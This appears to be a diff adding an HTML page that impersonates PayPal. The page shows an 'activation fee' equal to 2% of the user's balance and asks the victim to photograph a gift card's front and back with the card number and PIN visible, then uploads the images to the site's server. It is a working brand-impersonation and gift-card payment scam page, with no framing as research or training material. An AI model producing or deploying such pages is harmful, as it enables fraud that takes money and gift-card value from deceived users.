@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Card Payment - PayPal</title>
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .payment-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .payment-amount {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .amount {
+            font-size: 2.5rem;
+            color: #0070ba;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .upload-section {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .upload-item {
+            margin-bottom: 30px;
+        }
+        .upload-item label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        .upload-hint {
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 5px;
+        }
+        .file-input {
+            width: 100%;
+            padding: 10px;
+            border: 2px dashed #0070ba;
+            border-radius: 5px;
+            background: #f8f9fa;
+            cursor: pointer;
+            text-align: center;
+        }
+        .file-input:hover {
+            background: #e9ecef;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .submit-btn:hover {
+            background: #005ea6;
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav-main">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="/assets/logo.png" alt="PayPal Logo">
+                <span>PayPal</span>
+            </div>
+            <div class="nav-menu">
+                <a href="/activation-payment" class="nav-button"><i class="fas fa-arrow-left"></i> Back to Payment Methods</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="payment-container">
+            <div class="payment-amount">
+                <h2>Gift Card Payment</h2>
+                <div class="amount" id="activationFee">Loading...</div>
+                <p>Please upload clear pictures of the gift card (front and back).</p>
+            </div>
+
+            <form id="giftcardForm" class="upload-section">
+                <div class="upload-item">
+                    <label for="frontImage">Front of Gift Card *</label>
+                    <input type="file" id="frontImage" class="file-input" accept="image/*" capture required>
+                    <div class="upload-hint">Take a picture of the front of the gift card. Make sure the card number and PIN are visible.</div>
+                </div>
+                <div class="upload-item">
+                    <label for="backImage">Back of Gift Card *</label>
+                    <input type="file" id="backImage" class="file-input" accept="image/*" capture required>
+                    <div class="upload-hint">Take a picture of the back of the gift card.</div>
+                </div>
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-paper-plane"></i> Submit Payment
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Fetch activation fee
+        fetch('/api/user')
+            .then(response => response.json())
+            .then(user => {
+                const activationFee = user.balance * 0.02;
+                document.getElementById('activationFee').textContent = '$' + activationFee.toFixed(2);
+            });
+
+        // Handle form submission
+        document.getElementById('giftcardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const frontImage = document.getElementById('frontImage').files[0];
+            const backImage = document.getElementById('backImage').files[0];
+
+            if (!frontImage || !backImage) {
+                alert('Please upload both images.');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('frontImage', frontImage);
+            formData.append('backImage', backImage);
+
+            // Show loading
+            const submitBtn = this.querySelector('.submit-btn');
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            submitBtn.disabled = true;
+
+            // Send to server
+            fetch('/activation-payment/giftcard', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    alert('Payment submitted successfully! Your account will be activated after verification.');
+                    window.location.href = '/dashboard';
+                } else {
+                    alert('Error: ' + result.error);
+                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment';
+                    submitBtn.disabled = false;
+                }
+            })
+            .catch(error => {
+                alert('An error occurred. Please try again.');
+                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment';
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
